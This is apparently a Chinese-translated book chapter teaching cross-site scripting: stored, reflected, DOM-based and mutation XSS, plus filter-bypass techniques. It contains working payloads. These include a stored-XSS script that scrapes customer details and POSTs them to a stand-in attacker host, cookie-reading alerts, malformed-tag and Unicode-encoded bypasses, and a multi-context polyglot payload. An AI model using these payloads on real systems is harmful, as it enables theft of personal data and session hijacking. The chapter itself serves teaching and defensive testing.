黑客首先是一名侦探。一个好的黑客是组织有序的侦探，而一个伟大的黑客则是一个恰好拥有杰出技术知识和技能的侦探。而黑客大师则兼具上述所有特质，并且随着那些试图防范他们的人不断提高自身技术，他们也在不断地学习和适应，提升自己的技能。

### 应用侦察

在第一部分中，我们学习了如何对 Web 应用程序进行前哨探测，并在此过程中了解了其底层技术和结构的各种细节。第二部分则是关于如何利用这些应用程序中的安全漏洞。

然而，第一部分的课程绝不能忘记。这些经验在未来将是至关重要的，你很快就会明白其中的原因。

在第一部分中，你学习了如何确定应用程序使用何种类型的 API 向客户端（在我们的示例中为浏览器）提供数据。我们了解到，大多数现代 Web 应用程序使用 REST API 来实现这一点。接下来的章节中的示例大多涉及通过 REST API 发送有效载荷。因此，在这里，能够确定你试图入侵的应用程序的 API 类型将至关重要。

此外，我们结合了公共记录和网络脚本来发现未记录在册的 API 端点。在本章中，我们开发的漏洞利用将适用于许多不同的 Web 应用程序。正如我们在第一部分中学到的，有时针对同一所有者的多个应用程序尝试相同的漏洞利用会非常有价值。由于代码重用的存在，你极有可能针对单个 Web 应用程序发现漏洞，并将其复制到通过前几章讨论的技术发现的内部 Web 应用程序中。

围绕端点发现的主题同样会大有裨益，因为你可能会遇到多个接收相似结构载荷的 API 端点。也许针对 `/users/1234/friends` 的攻击不会返回任何敏感的非公开数据，但 `/users/1234/settings` 却可以。

理解如何摸清 Web 应用程序当前使用的身份验证（Authentication）方案同样至关重要。如今的大多数 Web 应用程序都会为已验证用户提供比访客更多的功能超集。这意味着你可以使用身份验证令牌（Authentication Token）攻击的 API 数量更多，而且因这些请求而运行的进程所获得的权限也可能会更大。

在第一部分中，我们还学习了如何识别应用程序中的第三方依赖（通常是 OSS）。在这一部分中，我们将学习如何寻找并定制针对第三方依赖的公开记录漏洞。有时，我们甚至能发现由于自定义代码与第三方代码集成而产生的安全漏洞。

我们围绕应用程序架构进行的讨论和分析在此处也将发挥重要价值，因为我们可能会发现，虽然应用程序 A 无法被利用，但应用程序 B 可以。如果我们没有办法直接向应用程序 B 部署漏洞利用，我们可能会研究应用程序 A 与应用程序 B 通信的方式，以尝试寻找一种将有效载荷递送到应用程序 A 的方法，然后应用程序 A 会在之后将其传递给应用程序 B。

总之，且让我再次指出：前几章的侦察技能与接下来的章节中的黑客技能是相辅相成的。黑客攻击和侦察本身都是复杂且有趣的技能，但当结合在一起时，它们的价值要高得多。

## 第10章 跨站脚本攻击

跨站脚本攻击（Cross-Site Scripting，XSS）漏洞是整个互联网上最常见的漏洞之一。它们的出现是对当今 Web 应用程序中用户交互量日益增加的直接回应。

从本质上讲，XSS 攻击是通过利用 Web 应用程序在用户浏览器上执行脚本这一事实来发挥作用的。如果执行的脚本能以任何方式被污染或修改——尤其是被终端用户修改，那么任何类型动态创建且执行的脚本都会使 Web 应用程序面临风险。

XSS 攻击有多种分类方式，其中最主要的三种是：

*   存储型（Stored）（代码在执行前存储在数据库中）
*   反射型（Reflected）（代码不存储在数据库中，而是由服务器反射回来）
*   基于 DOM（DOM-based）（代码在浏览器中存储并执行）

除了这些之外，确实还存在其他分类变体，但这三种涵盖了大多数现代 Web 应用程序需要定期防范的 XSS 类型。这三种 XSS 攻击类型已被开放式 Web 应用程序安全项目（Open Web Application Security Project，OWASP）等委员会指定为 Web 上最常见的 XSS 攻击向量。我们将进一步探讨这三者，但首先让我们看看如何生成 XSS 攻击，以及如何发现支持此类攻击的漏洞。

### XSS 发现与利用

想象一下，你对 mega-bank.com 提供的服务水平感到不满。幸运的是，mega-bank.com 提供了一个客户支持门户网站 support.mega-bank.com，你可以在其中撰写反馈，并希望收到客户支持代表的回复。

你在支持门户中写了一条评论，内容如下：

> I am not happy with the service provided by your bank.
> I have waited 12 hours for my deposit to show up in the web application.
> Please improve your web application.
> Other banks will show deposits instantly.
> —Unhappy Customer, support.mega-bank.com

现在，为了强调你对这家虚拟银行有多么不满，你决定将几个词加粗。不幸的是，提交支持请求的界面（User Interface，UI）不支持文本加粗。

因为你懂一点技术，所以你尝试添加一些 HTML 加粗标签：

> I am not happy with the service provided by your bank.
> I have waited 12 hours for my deposit to show up in the web application.
> `<strong>Please improve your web application.</strong>`
> Other banks will show deposits instantly.
> —Unhappy Customer, support.mega-bank.com

按下回车键后，你的支持请求会显示给你。`<strong>` 和 `</strong>` 标签内的文本已被加粗。

客户支持代表很快给你回了信：

> Hello, I am Sam with MegaBank support.
> I am sorry you are unhappy with our application.
> We have a scheduled update next month on the fourth that should increase the speed at which deposits are reflected in our app.
> By the way, how did you bold that text?
> —Sam from Customer Support, support.mega-bank.com

这里发生的事情在许多 Web 应用程序中其实相当常见。这里有一个非常简单的架构错误，如果任其发展直到被黑客发现，对一家公司来说可能是致命的：

```
user submits comment via web form ->
user comment is stored in database ->
comment is requested via HTTP request by one or more users ->
comment is injected into the page ->
injected comment is interpreted as DOM rather than text
```

通常，这是由于开发人员直接将 HTTP 请求的结果应用于文档对象模型（Document Object Model，DOM）造成的。这通常是通过类似于以下的脚本完成的：

```javascript
/*
 * Create a DOM node of type 'div'.
 * Append to this div a string to be interpreted as DOM rather than text.
 */
const comment = 'my <strong>comment</strong>';
const div = document.createElement('div');
div.innerHTML = comment;

/*
 * Append the div to the DOM, with it the innerHTML DOM from the comment.
 * Because the comment is interpreted as DOM, it will be parsed
 * and translated into DOM elements upon load.
 */
const wrapper = document.querySelector('#commentArea');
wrapper.appendChild(div);
```

因为文本是被直接附加到 DOM 中的，所以它被解析为 DOM 标记而不是文本。在当前情况下，我们的客户支持请求中包含了一个 `<strong></strong>` 标签。

在更具恶意性的情况下，我们本可以使用相同的漏洞造成巨大的破坏。脚本标签是利用 XSS 漏洞最流行的方式，但利用此类漏洞的方法还有很多。

设想一下，如果支持评论中包含的不是简单的加粗标签，而是以下内容：

> I am not happy with the service provided by your bank.
> I have waited 12 hours for my deposit to show up in the web application.
> Please improve your web application.
> Other banks will show deposits instantly.
> `<script>`
> `/*`
> ` * Get a list of all customers from the page.`
> ` */`
> `const customers = document.querySelectorAll('.openCases');`
> `/*`
> ` * Iterate through each DOM element containing the openCases class,`
> ` * collecting privileged personal identifier information (PII)`
> ` * and store that data in the customerData array.`
> ` */`
> ` const customerData = [];`
> ` customers.forEach((customer) => {`
> ` customerData.push({`
> ` firstName: customer.querySelector('.firstName').innerText,`
> ` lastName: customer.querySelector('.lastName').innerText,`
> ` email: customer.querySelector('.email').innerText,`
> ` phone: customer.querySelector('.phone').innerText`
> ` });`
> ` });`
> `/*`
> ` * Build a new HTTP request, and exfiltrate the previously collected`
> ` * data to the hacker's own servers.`
> ` */`
> ` const http = new XMLHttpRequest();`
> ` http.open('POST', 'https://steal-your-data.com/data', true);`
> ` http.setRequestHeader('Content-type', 'application/json');`
> ` http.send(JSON.stringify(customerData);`
> `</script>`
> —Unhappy Customer, support.mega-bank.com

这是一个更具恶意性的使用场景。由于许多原因，它是极其危险的。上述代码就是所谓的存储型 XSS（Stored XSS）攻击——XSS 的一种变体，它依赖于将实际的攻击代码存储在应用程序所有者的数据库中。在我们的案例中，我们发送给支持部门的评论正被存储在 MegaBank 的服务器上。

当脚本标签通过 JavaScript 触及 DOM 时，浏览器的 JavaScript 解释器会立即被调用，并运行 `<script></script>` 标签内的代码。这意味着我们的代码在不需要客户支持代表进行任何交互的情况下就会运行。

这段代码所做的事情非常简单，不需要专家级黑客就能编写出来。我们正在使用 `document.querySelector()` 遍历 DOM，并窃取只有客户支持代表或 MegaBank 员工才有权访问的特权数据。我们在 UI 中找到这些数据，将其转换为美观的 JSON 以便阅读和存储，然后将其发送回我们自己的服务器以供使用或出售。

最可怕的是，因为这段代码在脚本标签内部，所以客户支持代表是看不到它的。客户支持代表会看到字面上的请求文本，但 `<script></script>` 标签以及其中的所有内容都会被隐藏，并在后台执行。浏览器会将该文本解析为，嗯，文本。但它看到脚本标签时，会将其解析为脚本，就像合法开发人员为合法网站编写内联脚本一样。

更有意思的是，如果有另一个代表打开这个评论，恶意的脚本也会在他们的浏览器状态下运行。这意味着由于脚本存储在数据库中，当通过 UI 请求和查看时，任何查看此评论的特权用户都会受到该脚本的攻击。

这是一个在缺乏适当安全控制的 Web 应用程序中，存储型 XSS 攻击能够发挥作用的经典例子。这是一个简单的演示，虽然可以很容易地进行防范（正如我们将在第三部分中看到的那样），但它仍然是进入 XSS 世界的一个坚实切入点。

简而言之，XSS 攻击：

*   在浏览器中运行非 Web 应用程序所有者编写的脚本
*   可以在后台运行，无需任何可见性或所需的用户输入来开始执行
*   可以获取当前 Web 应用程序中存在的任何类型的数据
*   可以自由地与恶意 Web 服务器发送和接收数据
*   由于未对用户输入进行适当的净化（Sanitize）并将其嵌入到 UI 中而发生
*   可用于窃取会话令牌（Session Token），从而导致账户接管（Account Takeover）
*   可用于在当前 UI 上绘制 DOM 对象，从而实现非技术用户无法识别的钓鱼攻击

这应该能让你对 XSS 攻击背后的威力——以及危险性——有所了解。

### 存储型 XSS

存储型 XSS （Stored XSS）攻击可能是最常见的 XSS 攻击类型。存储型 XSS 攻击很有意思，因为它们是最容易检测到的 XSS 类型，但往往也是最危险的类型之一，因为很多时候它们能影响到最多的用户。

一个存储在数据库中的对象可以被许多用户查看。在某些情况下，如果一个全局对象被感染，你所有的用户都可能面临存储型 XSS 攻击的风险。

如果你运营或维护一个视频托管网站，并在首页上“推荐”了一个视频，那么该视频标题中的存储型 XSS 可能会影响到该视频展示期间的每一位访问者。由于这些原因，存储型 XSS 攻击对一个组织来说可能是极其致命的。

另一方面，存储型 XSS 的永久性特征使得检测变得非常容易。虽然脚本本身是在客户端（浏览器）上执行的，但脚本是存储在数据库中（即服务器端）的。这些脚本在服务器端以文本形式存储，并且不会被执行（可能在涉及 Node.js 服务器的高级情况下除外，在这种情况下它们会被归类为远程代码执行（Remote Code Execution，RCE），我们将在后面进行介绍）。

由于脚本存储在服务器端，定期扫描数据库条目以寻找存储型脚本的迹象，对于一个存储了大量由终端用户提供的数据的网站来说，可能是一个廉价且高效的缓解方案。事实上，这是当今最注重安全的软件公司用来缓解 XSS 风险的众多技术之一。然而，我们很快就会发现，这不能成为最终的解决方案，因为高级的 XSS 有效载荷（Payload）甚至可能不是用纯文本编写的（例如，base64、二进制等）。它们也可能被存储在多个地方，并且只有在被特定服务拼接以便在客户端使用时才会产生危险。这些都是经验丰富的黑客用来绕过开发人员实现的防御机制的一些技巧。

我们在前面演示存储型 XSS 攻击时使用的例子是直接将 script 标签注入到 DOM 中，并通过 JavaScript 执行恶意脚本。这是 XSS 最常见的方法，但也是聪明的安全工程师和有安全意识的开发人员经常会防范的方法。一个简单的禁止 script 标签的正则表达式（Regex），或者一个防止内联脚本执行的内容安全策略（Content Security Policy，CSP）规则，就能把这种攻击阻截在摇篮里。

XSS 攻击被归类为“存储型”的唯一要求是，Payload 必须存储在应用程序的数据库中。并不要求此 Payload 必须是有效的 JavaScript，也不要求客户端必须是 Web 浏览器。如前所述，除了 script 标签之外，还有许多替代方案同样会导致数据泄露或脚本执行。此外，还有许多客户端通过 Web 服务器请求数据，这些数据可能会被存储型 XSS 污染——Web 浏览器只是最常见的靶子。

### 反射型 XSS

大多数书籍和教育资源在介绍存储型 XSS 之前都会先讲反射型 XSS（Reflected XSS）。但我认为，对于初出茅庐的黑客来说，反射型 XSS 攻击往往比存储型 XSS 攻击更难发现和利用。

从开发人员的角度来看，存储型 XSS 攻击非常容易理解。客户端将资源发送到服务器，通常是通过 HTTP。服务器用从客户端接收到的资源更新数据库。稍后，该资源可能会被其他用户访问，在这种情况下，恶意脚本将在请求者的互联网浏览器中不知不觉地执行。

相比之下，反射型 XSS 攻击的运作方式与存储型 XSS 攻击相同，但不存储在数据库中。相反，服务器将 Payload 直接反射回客户端。

由于不存储在服务器上，与存储型 XSS 相比，反射型 XSS 可能有点难以理解。让我们从一个例子开始。

我们再次成为一家虚拟银行的客户，该银行的 Web 应用程序位于 mega-bank.com。这一次，我们正尝试查找关于如何开设一个新的储蓄账户以补充我们现有支票账户的支持文档。幸运的是，mega-bank.com 的支持门户 support.mega-bank.com 有一个搜索栏，我们可以用它来查找常见的支持请求及其解决方案。

我们首先尝试搜索 "open savings account"。此搜索将我们重定向到一个新的 URL：`support.mega-bank.com/search?query=open+savings+account`。在此搜索结果页面上，我们看到了标题：3 results for "open savings account"。

接下来，我们尝试将 URL 调整为 `support.mega-bank.com/search?query=open+checking+account`。结果页面上的标题现在变为：4 results for "open checking account"。由此我们可以推断，URL 查询参数与结果页面上显示的标题之间存在关联。

既然我们记得之前通过在评论中加入 `<strong></strong>` 标签在支持表单中发现了一个存储型 XSS 漏洞，那么让我们尝试在搜索查询中加入一个加粗标签：`support.mega-bank.com/search?query=open+<strong>checking</strong>+account`。令我们惊讶的是，我们生成的新 URL 确实把结果页面中的标题加粗了。

利用这一新发现的知识，让我们在查询参数中加入一个 script 标签：`support.mega-bank.com/search?query=open+<script>alert(test);</script>checking+account`。打开这个 URL 会加载搜索结果，但最初会弹出一个包含 "test" 字样的警告模态框。

我们在这里发现的是一个 XSS 漏洞——只是这一次它不会存储在服务器中。相反，服务器将读取它并将其发送回客户端。这些类型的漏洞被称为“反射型 XSS”。

此前我们讨论了存储型 XSS 的风险，并提到使用存储型 XSS 很容易影响到许多用户。但我们也提到，存储型 XSS 的一个缺点是这些攻击很容易被发现，因为它们存储在服务器端。

反射型 XSS 要难检测得多，因为这些攻击通常直接针对某个用户，并且永远不会存储在数据库中。在我们的例子中，我们可以构建一个恶意的链接 Payload，并将其直接发送给我们希望攻击的用户。这可以通过电子邮件、网页广告或许多其他方式来完成。

此外，我们之前讨论的反射型 XSS 可以很容易地伪装成一个合法的链接。让我们以这段 HTML 片段为例：

```html
Welcome to MegaBank Fans!

Your #1 source for legit MegaBank support info and links.

<a href="https://mega-bank.com/signup">Become a New Customer</a>
<a href="https://mega-bank.com/promos">See Promotional Offers</a>
<a href="https://support.mega-bank.com/search?query=open+<script>alert('test');</script>checking+account">Create a New Checking Account</a>
```

这里我们有三个链接，所有链接都有自定义的文本。其中两个是合法的。点击文本为 "Create a New Checking Account" 的最后一个链接将带你进入支持页面。`alert()` 将暗示发生了一些滑稽的事情，但就像之前的存储型 XSS 例子一样，我们可以很容易地在后台执行一些代码。也许我们可以找到足够的客户信息来冒充该用户，或者如果在支持门户 UI 中存在支票/路由账号，我们就可以获取它们。

这种反射型 XSS 依赖于一个 URL，这使得攻击者极易进行分发。大多数反射型 XSS 不会这么容易分发，可能需要终端用户采取额外的操作，例如将 JavaScript 粘贴到 Web 表单中。

可以肯定地说，作为一般规律，反射型 XSS 在规避检测方面要好得多，但通常较难分发给大量的用户。

### 基于 DOM 的 XSS

XSS 攻击的最后一个主要分类是基于 DOM 的 XSS（DOM-Based XSS）。DOM XSS 可以是反射型的，也可以是存储型的，但它利用浏览器的 DOM 接收器（Sink）和源（Source）来执行。由于浏览器 DOM 实现的差异，某些浏览器可能存在漏洞，而其他浏览器则没有。这些 XSS 攻击比传统的反射型或存储型 XSS 更难发现和利用，因为它们需要对浏览器 DOM 和 JavaScript 有深入的了解。

DOM XSS 与其他形式的 XSS 之间的主要区别在于，基于 DOM 的 XSS 攻击永远不需要与服务器进行任何交互。因此，现在有一种趋势开始将 DOM XSS 归类为名为客户端 XSS（Client-Side XSS）的新类别的子集。

因为 DOM XSS 的运行不需要服务器，所以浏览器 DOM 中必须同时存在“源”（Source）和“接收器”（Sink）。通常，源是能够存储文本的 DOM 对象，而接收器是能够执行以文本形式存储的脚本的 DOM API。由于 DOM XSS 永远不会触及服务器，因此几乎不可能用静态分析工具或任何其他类型的流行扫描器来检测它。

DOM XSS 也很难处理，因为当今使用的不同浏览器数量众多。非常有可能，在一个浏览器发布的 DOM 实现中存在的 Bug，在另一个浏览器发布的 DOM 实现中并不存在。

对于浏览器版本也是如此。2015 年的浏览器版本可能存在漏洞，而现代浏览器可能没有。如果给出的关于浏览器/操作系统的细节不够，一家试图支持多种浏览器的公司在复现 DOM XSS 攻击时可能会遇到困难。JavaScript 和 DOM 都是建立在开放规范（TC39 和 WHATWG）之上的，但每个浏览器的实现都有很大差异，而且往往因设备而异。

闲话少说，让我们来分析一个 mega-bank.com 的 DOM XSS 漏洞。

MegaBank 为其 401(k) 管理服务提供了一个投资门户，位于 `investors.mega-bank.com`。在 `investors.mega-bank.com/listing` 内部是一个可通过 401(k) 缴款进行投资的基金列表。左侧导航菜单提供了对这些基金的搜索和过滤功能。

由于基金数量有限，搜索和排序是在客户端进行的。搜索 "oil" 会将页面 URL 修改为 `investors.mega-bank.com/listing?search=oil`。类似地，过滤 "usa" 以仅查看总部位于美国的基金将生成 URL `investors.mega-bank.com/listing#usa`，并会自动将页面滚动到美国基金系列。

现在需要注意的是，仅仅因为 URL 发生了改变，并不总是意味着正在对服务器发起请求。在利用了自身基于 JavaScript 的路由器的现代 Web 应用程序中，情况往往如此，因为这可以带来更好的用户体验。

当我们输入恶意的搜索查询时，在这个特定的网站上不会遇到任何滑稽的交互。但需要注意的是，像 `search` 这样的查询参数可能是 DOM XSS 的源，并且在所有主流浏览器中都可以通过 `window.location.search` 找到它们。

同样，哈希（Hash）也可以通过 `window.location.hash` 在 DOM 中找到。这意味着 Payload 可以被注入到搜索查询参数或哈希中。在许多这些源中，危险的 Payload 不会引起任何麻烦，除非另一段代码实际上以某种可能导致脚本执行发生的方式使用了它——因此需要同时存在“源”和“接收器”。

让我们想象一下，MegaBank 在同一个页面中包含以下代码：

```javascript
/*
 * Grab the hash object #<x> from the URL.
 * Find all matches with the findNumberOfMatches() function,
 * providing the hash value as an input.
 */
const hash = document.location.hash;
const funds = [];
const nMatches = findNumberOfMatches(funds, hash);

/*
 * Write the number of matches found, plus append the hash
 * value to the DOM to improve the user experience.
 */
document.write(nMatches + ' matches found for ' + hash);
```

在这里，我们正在利用源（`window.location.hash`）的值来生成一些文本以显示给用户。在这种情况下，这是通过接收器（`document.write`）完成的，但也可以通过许多其他接收器来完成，其中一些接收器需要比其他接收器付出更多或更少的努力。

想象一下，我们生成了一个类似于这样的链接：

`investors.mega-bank.com/listing#<script>alert(document.cookie);</script>`

一旦 `document.write()` 调用将此哈希值注入到 DOM 中并被解析为 script 标签，就会导致该值作为脚本执行。这将显示当前的会话 Cookie，但也可以做许多有害的事情，正如我们在过去的 XSS 例子中看到的那样。

由此可见，虽然此 XSS 不需要服务器，但它确实需要同时存在源（`window.location.hash`）和接收器（`document.write`）。此外，如果传入了合法的字符串，它不会引起任何问题，因此可能会在很长一段时间内未被察觉。

### 基于突变的 XSS

几年前，我的朋友 Mario Heiderich 发表了一篇名为《mXSS Attacks: Attacking Well-Secured Web-Applications by Using innerHTML Mutations》的论文。这篇论文首次将一种被称为基于突变的 XSS（Mutation-Based XSS，mXSS）的新兴 XSS 攻击分类引入大众视野。

如今，针对所有主流浏览器都可以进行 mXSS 攻击。它们依赖于对浏览器在渲染 DOM 节点时执行优化和条件判断的方法的深入理解。

> 正如基于突变的 XSS 攻击在过去不广为人知或不被理解一样，未来的技术也可能容易受到 XSS 的攻击。XSS 风格的攻击可以针对任何客户端显示技术，尽管它们通常集中在浏览器中，但桌面和移动技术也可能存在漏洞。

虽然 mXSS 攻击较新且经常被误解，但它们已被用于绕过目前可用的最强大的 XSS 过滤器。像 DOMPurify、OWASP AntiSamy 和 Google Caja 等工具都曾被 mXSS 绕过，并且许多大型 Web 应用程序（特别是邮件客户端）已被发现存在漏洞。从本质上讲，mXSS 的运作方式是利用对过滤器安全的 Payload，这些 Payload 在通过过滤后最终会*突变*为不安全的 Payload。

通过一个例子最容易理解 mXSS。2019 年初，一位名叫 Masato Kinugawa 的安全研究员发现了一个影响名为 Closure 的 Google 库的 mXSS，该库被用于 Google 搜索内部。

Masato 是通过使用一个名为 DOMPurify 的净化库来实现这一点的，Closure 使用该库来过滤潜在的 XSS 字符串。DOMPurify 在客户端（浏览器中）运行，并通过在允许字符串作为 `innerHTML` 插入之前读取字符串来进行过滤。这实际上是净化将被通过 `innerHTML` 注入到 DOM 中的字符串的最有效方法，因为浏览器的实现各不相同，且浏览器版本也各不相同（因此，服务器端过滤不会那么有效）。通过将 DOMPurify 库发送到客户端并执行评估，Google 期望他们能拥有一个在旧版和新版浏览器中都适用的强大 XSS 过滤解决方案。

Masato 使用的 Payload 包含以下内容：

```html
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
```

从技术上讲，这个 Payload 应该是 DOM 安全的，因为由于标签和引号的设置方式，直接追加此内容不会导致脚本执行。正因为如此，DOMPurify 允许它作为“无 XSS 风险”通过，但当它被加载到浏览器 DOM 中时，DOM 执行了一些优化，导致它看起来像这样：

```html
<noscript><p title="</noscript>
<img src="x" onerror="alert(1)">
"">
"
```

发生这种情况的原因是 DOMPurify 在其净化过程中使用了一个根元素 `<template>`。`<template>` 标签会被解析但不会被渲染，因此它非常适合在净化中使用。

在 `<template>` 标签内部，元素脚本执行是被禁用的。当脚本执行被禁用时，`<noscript>` 标签代表其子元素，但当脚本执行被启用时，它什么都不做。换句话说，`img onerror` 在净化器内部无法执行脚本，但当它通过净化并移动到真实的浏览器环境中时，`<p title="` 被忽略了，而 `img onerror` 变为了有效的。

总结一下，浏览器 DOM 元素经常根据其父元素、子元素和兄弟元素进行条件性动作。在某些情况下，黑客可以利用这一事实，构建能通过不属于有效脚本来绕过过滤器的 XSS Payload，但在浏览器中实际运行时会变为有效的脚本。

基于突变的 XSS 是非常崭新的，它在应用安全行业中经常被误解。在网络上可以找到许多概念验证（Proof-of-Concept，PoC）漏洞利用，并且可能会出现更多。不幸的是，正因为如此，mXSS 可能会长期存在。

### 绕过过滤器

在使用任何形式的 XSS 尝试攻击应用程序时，最常遇到的陷阱之一是客户端过滤阻止了 Payload 的执行。幸运的是，只有极少比例的网站使用了像 Cure53 的 DOMPurify 这样的一流净化/过滤技术（图 10-4）。其余网站要么不使用过滤，要么使用自研的过滤，或者使用未经广泛测试的库或框架。

*图 10-4. DOMPurify 是行业标准的 XSS 净化器，它利用许多底层 JavaScript 和 DOM API 来保护 HTML、MathML 和 SVG 文件*

由于 DOM 和 JS 规范非常复杂，有很多方法可以使 JavaScript Payload 以不同寻常的方式执行，从而绕过仅寻找常见或规范 JavaScript Payload 的过滤系统。

#### 自闭合 HTML 标签

浏览器的一个独特怪癖是，尽管没有闭合标签的 HTML 标签不被认为是规范的，但如果检测到没有闭合的开始标签，浏览器将尝试闭合该标签。

> 这种行为在许多 XML、PDF 和 SVG 解析工具中也可以看到。每个实现都有其独特的错误纠正，因此了解这些工具的怪癖可能会让你洞察到可能的攻击向量。

许多客户端过滤工具会评估成对的标签，因此，残缺的 script 标签可能能够绕过上述过滤，然后由浏览器重新生成（从而能够执行脚本）。示例如下：

```html
<script>alert() // 实际代码
<script>alert()<script> // 浏览器“修复”后的代码
```

这是一种简单的技术，但每次尝试花费的精力很少。更复杂的技术建立在这种自我修复或纠错行为之上。在本书的其余部分中，我将重点介绍自纠错算法使攻击成为可能的案例。

#### 协议相对 URL

协议相对 URL（Protocol-Relative URL，PRURL）是所有主流浏览器都支持的遗留机制，它允许浏览器选择用于打开链接的协议。由于浏览器可能会使用较不安全的协议选项打开链接（例如，打开 `http://` 而不是 `https://`），这种 URL 模式被认为是一种安全反模式（Anti-Pattern）。然而，因为大多数浏览器仍然支持 PRURL 方案，所以它是绕过常见 XSS Payload 过滤器的有效方法。

使用这些 URL 的方法很简单。如果过滤脚本试图撤销对引用外部 URL 的脚本或 HTML Payload 的使用，只需移除 HTTP 或 HTTPS 协议，改用 `//`。一旦脚本被加载到 DOM 中，浏览器就会选择一个看起来最相关的方案，这通常会导致过滤绕过，因为大多数过滤发生在 DOM 节点被实例化之前。

下面可以看到两个 PRURL 链接示例：

```html
<a href="https://evil-website.com">click</a> <!-- 已被过滤 -->
<a href="//evil-website.com">click</a> <!-- 未被过滤 -->
```

请注意，如果你正在测试一个你可以直接联系到开发人员的 Web 应用程序，你应该主张他们出于此处描述的原因避免使用 PRURL。

#### 畸形标签

现代浏览器拥有再生代码，以帮助整理奇形怪状的 HTML 标签。这通常意味着纠正包含字符串的引号的位置、数量或类型。由于过滤库在 DOM 加载之前检查代码，一个畸形标签可能会通过过滤，但在浏览器完成修复标签语法的艰巨工作后，能够完美执行。

用于超链接的 `<a>` 标签就是这样一个标签，大多数浏览器都会尝试纠正不恰当的引号。以下是两个此类无效的 `<a>` 标签，Chrome 会在初始渲染前将其恢复到完整功能：

```html
\<a onmouseover="alert(document.cookie)"\>xxs\</a\>
\<a onmouseover=alert(document.cookie)\>xxs\</a\>
```

最新版本的 Chrome 还会使用类似的引擎纠正 `<img>` 标签，允许像下面这样的 Payload 在浏览器逻辑整理后肆无忌惮地执行：

```html
<IMG """><SCRIPT>alert("XSS")</SCRIPT>"\>
```

许多安全研究人员在网上发布了类似的畸形攻击 Payload。可以对这些进行评估，以让你洞察如何更好地开发自己的畸形 Payload。

#### 编码转义

大多数过滤库在将 JavaScript 代码和 HTML 移交给浏览器进行评估、编译和渲染之前，会对它们执行某种静态分析。因为静态分析是在浏览器有机会生成节点和搭建抽象语法树（Abstract Syntax Tree，AST）之前执行的，所以静态分析检查必须寻找精确的 JavaScript 和 HTML 语法。

代表字符串、字符和数字的替代但有效的格式可以在 Payload 中进行替换，并且通常可以实现过滤绕过。Unicode 是用于此目的的最佳编码形式之一。

在 JavaScript 代码中，Unicode 字符可以随时替换拉丁字符。要在 JavaScript 脚本中编写 Unicode 字符，只需引入一个反斜杠，后跟拉丁字符 "u"（例如 `\u`），然后是代表你希望添加到代码中的 Unicode 字符的四位长度的十六进制字符串（0-9，A-F）（例如 `\u006c`）。网上存在许多资源，可以为你提供 Unicode 到拉丁字符的映射。Unicode 自 1987 年以来就一直存在，因此不仅得到了广泛支持，而且在在线和离线材料中关于 Unicode 的文档也非常丰富。考虑以下 JavaScript 代码片段：

```javascript
alert(1); // 由于标准的拉丁字符，被过滤器阻止
```

由于此 `alert(1)` 是最常用于测试 XSS Payload 的函数，因此会被许多常见的过滤脚本阻止。然而，相同的脚本可以用 Unicode 以多种方式编写：

```javascript
\u0061lert(1) // alert(1)，替换了 "a"
a\u006cert(1) // alert(1)，替换了 "l"
\u0061\u006c\u0065\u0072\u0074(1) // alert(1)，替换了所有字符
```

通常，尽管这种类型的编码对 JavaScript 解释器是有效的且能够执行脚本，但它会绕过过滤。这些字符替换很容易在浏览器开发者控制台中进行测试，在 Mac 上可以通过 `Command-Option-I` 访问，在 Windows 或 Linux 版本的 Chrome 浏览器上可以通过 `F12` 或 `Control+Shift+I` 访问。

#### 混合体 Payload

在寻找 XSS 接收器时，一个问题是浏览器包含各种潜在的上下文，每个上下文都期望非常特定类型的 Payload。例如，在 `eval()` 函数中可以正确执行的 XSS Payload，可能与 `element.innerHTML` 的不同。因此，如果针对每个上下文单独开发 Payload，尝试寻找可行的 XSS Payload 可能会是一个极其漫长的过程。

Polyglot Payload 是一种独特的测试工具，可以节省大量的时间，因为 Polyglot Payload 是能够在各种浏览器上下文中执行脚本的 XSS Payload。

以下 Polyglot 由 GitHub 用户 0xSobky 于 2018 年发布，它能够在十几种常见的 XSS 上下文中执行脚本：

```javascript
jaVasCript:/*-/*`/*\`/*'/*"/**/(/**/oNcliCk=alert() )
//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>
\x3csVg/<sVg/oNloAd=alert()//>\x3e`
```

兼容上下文的一些示例如下：

双引号标签属性：
```html
<input type="text" value="<polyglot>"></input>
```

单引号标签属性：
```html
<input type='text' value='<polyglot>'></input>
```

无引号标签属性：
```html
<input type=text value=<polyglot>></input>
```

HTML 注释：
```html
<!-- <polyglot> -->
```

HTML 标签：
```html
<title><polyglot></title>
```

JavaScript 单引号字符串：
```javascript
var str = "<polyglot>";
```

这只是上述 Polyglot Payload 可以成功执行的可能上下文的一小部分。访问 GitHub 上的 `0xSobky/HackVault` 以查看此 Payload 的所有已测试执行上下文，并在寻找可行的 XSS 利用时牢记它（以及类似的 Polyglot Payload），以便显著减少繁琐的工作。

### XSS 接收器和源

请记住，可利用的 XSS 漏洞由两个关键组件组成。第一个组件是接收器，即能够执行脚本的浏览器方法。第二个组件是源，通常是浏览器或网页中可以接受文本型 Payload 的地方，该 Payload 稍后将被接收器读取并执行。

除了最常见的接收器和源之外，还有数十个、甚至数百个很少使用的接收器和源，它们更有可能被利用，且不太可能受到过滤或净化的限制。以下是一个非详尽的接收器列表，其中包含一些很少有文档记录的接收器：

*   `eval()`
*   `<script>`
*   `javascript://`
*   `document.write()`
*   `document.writeln()`
*   `document.domain()`
*   `element.innerHTML`
*   `element.outerHTML`
*   `Function()`
*   `setTimeout()`
*   `setInterval()`
*   `execScript()`
*   `ScriptElement.src`
*   `document.location`
*   `range.createContextualFragment`

以下是一个非详尽的源列表，其中确实包含一些很少有文档记录的源：

*   `document.url`
*   `document.documentURI`
*   `document.baseURI`
*   `window.location.search`
*   `window.location.hash`
*   `window.location.cookie`
*   `window.location.pathname`
*   `window.location.href`
*   `document.URLEncoded`
*   `window.name`
*   `history.pushState()`
*   `localStorage`
*   `sessionStorage`
*   `document.referrer`
*   `window.indexedDB`

要寻找更多不常见的接收器和源，可以考虑阅读官方的 JavaScript（ECMAScript）和 DOM 规范。这些分别可以在 TC39 和 WHATWG 网站上找到。

### 总结

尽管与过去相比不那么常见，但 XSS 漏洞在当今的 Web 中仍然泛滥。由于 Web 应用程序中不断增加的用户交互量和数据持久化，XSS 漏洞在应用程序中出现的机会比以往任何时候都要大。

